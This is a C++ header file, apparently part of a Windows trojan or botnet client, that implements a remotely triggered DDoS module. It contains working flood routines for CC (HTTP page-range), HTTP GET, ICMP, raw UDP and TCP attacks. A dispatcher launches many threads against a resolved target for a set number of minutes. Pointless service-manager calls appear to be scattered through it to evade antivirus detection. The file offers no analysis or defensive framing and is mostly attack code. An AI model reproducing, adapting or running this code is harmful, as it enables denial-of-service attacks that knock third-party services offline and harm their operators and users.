// DDOS.h: interface for the DDOS class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_DDOS_H__9ED8C653_1052_4BCE_97A5_B9AA0905AF97__INCLUDED_)
#define AFX_DDOS_H__9ED8C653_1052_4BCE_97A5_B9AA0905AF97__INCLUDED_

#include "../common/macros.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include "DDOS_HEAD.h"
#pragma comment(lib,"WS2_32.LIB")

BOOL Attacking = FALSE;
BOOL Gobal_DDOS_Running = FALSE;
DDOS_DATA pDDOS;


DWORD WINAPI CC_Attack(LPVOID lparam)
{
	DDOS_DATA *pDDOS = (DDOS_DATA *)lparam;
	char *CC_HEAD =// "返旵灦ⅱ畯亴乑@ZL盨SUNB笧垙圸@ZL盨SUNB崻QLWEQWU笧xV峉LZ@ZL盨SUNB嵉LSORILW笧WxIN姙RUTJQBUZ@ZL禣CB笧旵笗RZ@ZL砆SVU嵆OLB@OJ笧LO峉QSVUZ@ZL瓳QWMQ笧LO峉QSVUZ@ZLU@嵄WULB笧璒xIJJQ弬寧灃SOMNQBIPJU粸┑瀯寧粸LROGC瀰寔塟@ZL燯TU@U@笧VBBN笍彆CZ@ZL砄LLUSBIOL笧玌UN嵄JIDUZ@ZLZ@ZL";
	"GET %s HTTP/1.1\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nAccept-Encoding: gzip, deflate\r\nHost: %s:%d\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 5.1)\r\nReferer: http://%s\r\nConnection: Keep-Alive\r\n\r\n";
//	EncryptData( (unsigned char*)CC_HEAD, 0, 88 );
	SOCKADDR_IN sockAddr;
	SOCKET	m_hSocket;
	int nSize, Flag = 1, Time = 200;
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port=htons(pDDOS->Port);
	sockAddr.sin_addr.s_addr = inet_addr(tgtIP);

	char tmp_head[2048], Buffer[4096];
	int a,b;
	DWORD nSzie;

	while( Attacking )
	{
		for ( a = pDDOS->CCAttack_First; a <= pDDOS->CCAttack_END; a++ )
		{
			if ( !Attacking ) break;
			memset( tmp_head, 0, sizeof(tmp_head) );
			wsprintf( tmp_head, pDDOS->GetPage, a );
			memset( Buffer, 0, sizeof(Buffer) );
			SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
			wsprintf( Buffer, CC_HEAD, tmp_head, pDDOS->Domain, pDDOS->Port, pDDOS->Domain );
			CloseServiceHandle(hSCM);
			nSize = lstrlen( Buffer ) + 1;
			for ( b = 1; b <= pDDOS->Packs; b++ )
			{
				if ( !Attacking ) break;
				m_hSocket = socket( PF_INET, SOCK_STREAM, IPPROTO_TCP );//建立套接字,应该不会失败吧?
				if ( connect( m_hSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0 ) 
				{
					closesocket(m_hSocket);
					continue;
				}
				setsockopt( m_hSocket, SOL_SOCKET, SO_SNDTIMEO,(char*)&Time,sizeof(Time));//发送超时
				setsockopt( m_hSocket, IPPROTO_TCP, TCP_NODELAY,(char*)&Flag,sizeof(Flag));//禁用Nagle算法
				setsockopt( m_hSocket, SOL_SOCKET, SO_SNDBUF,(char*)&nSize,sizeof(nSize));//设置发送数据的大小
				if ( CKeyboardManager::Mysend( m_hSocket, Buffer, nSize, 0 ) == SOCKET_ERROR ) break;
				CKeyboardManager::Myclosesocket(m_hSocket);
			}
			SleepEx(pDDOS->SleepTime,0);
		}
	}
	ExitThread(0);
	return 0;
}

DWORD WINAPI ICMP_Flood(LPVOID lparam)
{
	DDOS_DATA *pDDOS = (DDOS_DATA *)lparam;

	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2) ,&WSAData);
	SOCKET	m_hSocket;
	SOCKADDR_IN sockAddr;
	int i,timeout = 3000, Flag = 1;
	char SndBuffer[4096];

	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = inet_addr(tgtIP);

	m_hSocket = WSASocket( AF_INET, SOCK_RAW, IPPROTO_ICMP, NULL, NULL, WSA_FLAG_OVERLAPPED );
	if (m_hSocket == INVALID_SOCKET) return -1;
	setsockopt(m_hSocket, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
	setsockopt( m_hSocket, IPPROTO_TCP, TCP_NODELAY,(char*)&Flag,sizeof(Flag));//禁用Nagle算法

	ICMP_HEADER icmp_header;//icmp头结构
	icmp_header.i_code = 0;//发送默认
	icmp_header.i_id = GetTickCount()%10000; //自己的id
	icmp_header.i_cksum = 0; //发送包
	icmp_header.i_seq = 512;//序列
	icmp_header.i_type = 8; //告之所发送的是探测主机类型的icmp　即ping
	icmp_header.timestamp = GetTickCount(); //时间戳
	memset( SndBuffer, 0, sizeof(SndBuffer) );
	SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
	memcpy( SndBuffer, &icmp_header, sizeof(icmp_header) ); //复制
	CloseServiceHandle(hSCM);
	char strfill = GetTickCount()%200;
	memset( SndBuffer + sizeof(icmp_header), strfill, sizeof(SndBuffer) - sizeof(icmp_header) - 1 );
	((ICMP_HEADER*)&SndBuffer)->i_cksum = checksum( (USHORT*)&SndBuffer, sizeof(SndBuffer) );

	while(Attacking)
	{
		for ( i = 0; i <= pDDOS->Packs; i++ )
		{
			sendto( m_hSocket, SndBuffer, sizeof(SndBuffer), NULL, (struct sockaddr*)&sockAddr, sizeof(sockAddr)); 
		}
		Sleep(pDDOS->SleepTime);
	}

	closesocket(m_hSocket);
	ExitThread(0);
	return 0;
}

DWORD WINAPI HTTP_GET(LPVOID lparam)
{
	DDOS_DATA *pDDOS = (DDOS_DATA *)lparam;

	char *HTTP_HEAD =// "返彏盯弫寔Z@ZL禣CB笧旵笗RZ@ZL瓳QWMQ笧LO峉QSVUZ@ZL砄LLUSBIOL笧玌UN嵄JIDUZ@ZLZ@ZL";
	"GET / HTTP/1.1\r\nHost: %s:%d\r\nPragma: no-cache\r\nConnection: Keep-Alive\r\n\r\n";
	char Buffer[1024];
//	EncryptData( (unsigned char *)HTTP_HEAD, 0, 88 );
	int a;
//	wsprintf( Buffer, HTTP_HEAD, pDDOS->GetPage, pDDOS->Domain, pDDOS->Domain, pDDOS->Cookie );

//	WSADATA WSAData;
//	WSAStartup(MAKEWORD(2,2) ,&WSAData);
	SOCKADDR_IN sockAddr;
	SOCKET	m_hSocket;
	int nSize, Flag = 1, Time = 200;
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port=htons(pDDOS->Port);
	sockAddr.sin_addr.s_addr = inet_addr(tgtIP);

	memset( Buffer, 0, sizeof(Buffer) );
	SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
	wsprintf( Buffer, HTTP_HEAD, pDDOS->Domain, pDDOS->Port );
	CloseServiceHandle(hSCM);
	nSize = lstrlen(Buffer) + 1;
	while(Attacking)
	{
		for( a = 0; a <= pDDOS->Packs; a++ )
		{
			m_hSocket = socket( PF_INET, SOCK_STREAM, IPPROTO_TCP );//建立套接字,应该不会失败吧?
			if ( connect( m_hSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0 )
			{
				closesocket(m_hSocket);
				continue;
			}
			setsockopt( m_hSocket, SOL_SOCKET, SO_SNDTIMEO,(char*)&Time,sizeof(Time));//发送超时
			setsockopt( m_hSocket, IPPROTO_TCP, TCP_NODELAY,(char*)&Flag,sizeof(Flag));//禁用Nagle算法
			setsockopt( m_hSocket, SOL_SOCKET, SO_SNDBUF,(char*)&nSize,sizeof(nSize));//设置发送数据的大小
			if ( send( m_hSocket, Buffer, nSize, 0 ) == SOCKET_ERROR ) break;
			if ( !Attacking ) break;
			closesocket(m_hSocket);
		}
		Sleep(pDDOS->SleepTime);
	}
	closesocket(m_hSocket);
	ExitThread(0);

	return 0;
}

DWORD WINAPI UDP_Flood(LPVOID lparam)
{
	DDOS_DATA *pDDOS = (DDOS_DATA *)lparam;

	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2), &WSAData);
	
	SOCKET    SendSocket; 
	int    Flag = 1;
	int Time = 200;
	
	SendSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	if( SendSocket == INVALID_SOCKET ) 
		return -1; 

	setsockopt( SendSocket, IPPROTO_IP, IP_HDRINCL,(char*)&Flag,sizeof(Flag));
	setsockopt( SendSocket, SOL_SOCKET, SO_SNDTIMEO,(char*)&Time,sizeof(Time));//发送超时
	setsockopt( SendSocket, IPPROTO_TCP, TCP_NODELAY,(char*)&Flag,sizeof(Flag));//禁用Nagle算法
	setsockopt( SendSocket, SOL_SOCKET, SO_SNDBUF,(char*)&iTotalSize,sizeof(iTotalSize));//设置发送数据的大小

	SOCKADDR_IN addr_in;
	addr_in.sin_family=AF_INET;
	addr_in.sin_port=htons(pDDOS->Port);
	addr_in.sin_addr.s_addr=inet_addr(tgtIP);

	while(Attacking)
	{
		for ( int i = 1; i <= pDDOS->Packs; i++ )
		{
			sendto(SendSocket, pSendBuffer, iTotalSize, 0, (SOCKADDR *)&addr_in, sizeof(addr_in));
		}
		Sleep(pDDOS->SleepTime);
	}
	closesocket(SendSocket);
	ExitThread(0);
	return 0;
}

DWORD WINAPI Tcp_Flood(LPVOID lparam)
{
	DDOS_DATA *pDDOS = (DDOS_DATA *)lparam;
	char Buffer[2048];

	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2) ,&WSAData);
	SOCKADDR_IN sockAddr;
	SOCKET	m_hSocket;
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port=htons(pDDOS->Port);
	sockAddr.sin_addr.s_addr = inet_addr(tgtIP);

	while(Attacking)
	{
		m_hSocket = socket( PF_INET, SOCK_STREAM, IPPROTO_TCP );//建立套接字,应该不会失败吧?
		if ( connect(m_hSocket,(SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0 ) 
		{
			closesocket(m_hSocket);
			continue; //连接失败,继续
		}
		memset( Buffer, GetTickCount()%200, sizeof(Buffer) - 1 );//随机垃圾数据

		for( int a = 0; a <= pDDOS->Packs; a++ )
		{
			if ( send( m_hSocket, Buffer, sizeof(Buffer), 0 ) == SOCKET_ERROR ) break;//发送失败，退出循环继续
		}
		Sleep(pDDOS->SleepTime);
		closesocket(m_hSocket);
	}

	closesocket(m_hSocket);
	ExitThread(0);
	return 0;
}

DWORD WINAPI DDOS_Attacker(LPVOID lparam)
{
	if (Gobal_DDOS_Running)	//如果正在运行,则直接退出线程
	{
		return -1;
	}
	Gobal_DDOS_Running = TRUE;
	Attacking = TRUE;
	memcpy( &pDDOS, lparam, sizeof(DDOS_DATA) );

	int i = 0;
	if ( inet_addr(pDDOS.Domain) == INADDR_NONE )//如果是域名，则解析
	{
		struct hostent *hp = NULL;
		SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
		if ((hp = gethostbyname(pDDOS.Domain)) != NULL)
		{
			CloseServiceHandle(hSCM);
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			lstrcpy(tgtIP,inet_ntoa(in));
		}
		CloseServiceHandle(hSCM);
	}
	else
	{
		lstrcpy( tgtIP, pDDOS.Domain );
	}

	switch ( pDDOS.AttackFlag )
	{
	case DDOS_TCP:
		for ( i = 1; i <= pDDOS.Thread; i++ )
		{
			MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Tcp_Flood, (LPVOID)&pDDOS, 0, NULL, true);
		}
		break;
	case DDOS_UDP:
		fill_udp_buffer( &pDDOS );
		for ( i = 1; i <= pDDOS.Thread; i++ )
		{
			MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UDP_Flood, (LPVOID)&pDDOS, 0, NULL, true);
		}
		break;
	case DDOS_ICMP:
		for ( i = 1; i <= pDDOS.Thread; i++ )
		{
			MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ICMP_Flood, (LPVOID)&pDDOS, 0, NULL, true);
		}
		break;
	case DDOS_HTTP_GET:
		for ( i = 1; i <= pDDOS.Thread; i++ )
		{
			MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HTTP_GET, (LPVOID)&pDDOS, 0, NULL, true);
		}
		break;
	case DDOS_CC:
		for ( i = 1; i <= pDDOS.Thread; i++ )
		{
			MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CC_Attack, (LPVOID)&pDDOS, 0, NULL, true);
		}
		break;
	}

	if ( pDDOS.AttackTime != 0 )
	{
		for ( i = 1; i <= pDDOS.AttackTime; i++ )
		{
			Sleep(60000);
		}
		Attacking = FALSE;
		Sleep(1100);
		Gobal_DDOS_Running = FALSE;
	}

	return 0;
}

void DDOS_Stop()
{
	if ( !Gobal_DDOS_Running ) return;
	Attacking = FALSE;
	Sleep(1100);
	Gobal_DDOS_Running = FALSE;
}

#endif // !defined(AFX_DDOS_H__9ED8C653_1052_4BCE_97A5_B9AA0905AF97__INCLUDED_)
